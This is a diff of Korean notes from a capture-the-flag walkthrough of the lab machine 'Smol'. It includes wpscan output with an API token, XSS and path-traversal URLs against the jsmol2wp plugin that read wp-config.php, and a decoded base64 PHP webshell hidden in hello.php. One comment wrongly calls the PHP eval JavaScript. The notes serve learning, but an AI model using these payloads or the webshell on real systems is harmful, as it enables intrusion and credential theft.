@@ -1,10 +1,10 @@
-# IP: 10.10.198.23
+# IP: 10.10.52.253
 
 # nmap -> 22, 80
 
 http://www.smol.thm
 
-Nmap scan report for 10.10.198.23
+Nmap scan report for 10.10.52.253
 Host is up (0.29s latency).
 Not shown: 995 closed tcp ports (reset), 3 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -95,7 +95,7 @@ wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2Xae
 
 ---
 
-[+] URL: http://www.smol.thm/ [10.10.198.23]
+[+] URL: http://www.smol.thm/ [10.10.52.253]
 [+] Started: Thu Jul 24 15:03:12 2025
 
 Interesting Finding(s):
@@ -209,7 +209,7 @@ Checking Config Backups - Time: 00:00:11 <======================================
 
 # 취약점 그대로 악용하기 -> 사이트 웹 브라우저에 접속
 
-# IP: 10.10.198.23, www.smol.thm -> CVE 취약점 확인
+# IP: 10.10.52.253, www.smol.thm -> CVE 취약점 확인
 
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
 
@@ -324,7 +324,7 @@ require_once ABSPATH . 'wp-settings.php';
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/1d998ee7-0c88-412b-b447-5103a27aa833/image.png)
 
-# stored XSS 바로 확인 가능
+# 사이트 탐색 중 시스템 접근을 위한 데이터 수집
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/b6ccdc9b-2df6-4ca3-a428-a4277f4f3dc4/image.png)
 ![](https://velog.velcdn.com/images/agnusdei1207/post/477f28cf-9889-4aef-8be6-8cedd95d97b1/image.png)
@@ -352,7 +352,7 @@ require_once ABSPATH . 'wp-settings.php';
 
 11- Regular Security Audits: Conduct routine security assessments, vulnerability scans, and penetration tests.
 
-# https://github.com/WordPress/hello-dolly -> hello.php 플러그인 확인
+# hello dolly source code 구글링 -> https://github.com/WordPress/hello-dolly -> hello.php 플러그인 파일 확인
 
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 
@@ -366,6 +366,10 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../hello.php
 
 # http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+
+# 플러그인 파일 구조 (php)
+
+# 취약한 코드 및 base64 텍스트 발견 -> eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
 
 ```
 <?php
@@ -473,11 +477,9 @@ add_action( 'admin_head', 'dolly_css' );
 
 ```
 
-# eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=')); -> eval 발견
+# base64 decode
 
 echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d
-
-# base64 -> text
 
 if (isset($_GET["\143\155\x64"])) { system($\_GET["\143\x6d\144"]); }
 
@@ -490,3 +492,7 @@ cmd
 ┌──(root㉿docker-desktop)-[/]
 └─# printf "\143\155\x64"
 cmd
+
+# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행한다는 것을 알 수 있음 -> eval: 문자열을 자바스크립트로 실행하는 메소드
+
+# 시스템 접근을 위해 reverse shell 을 만들고 encode 하기
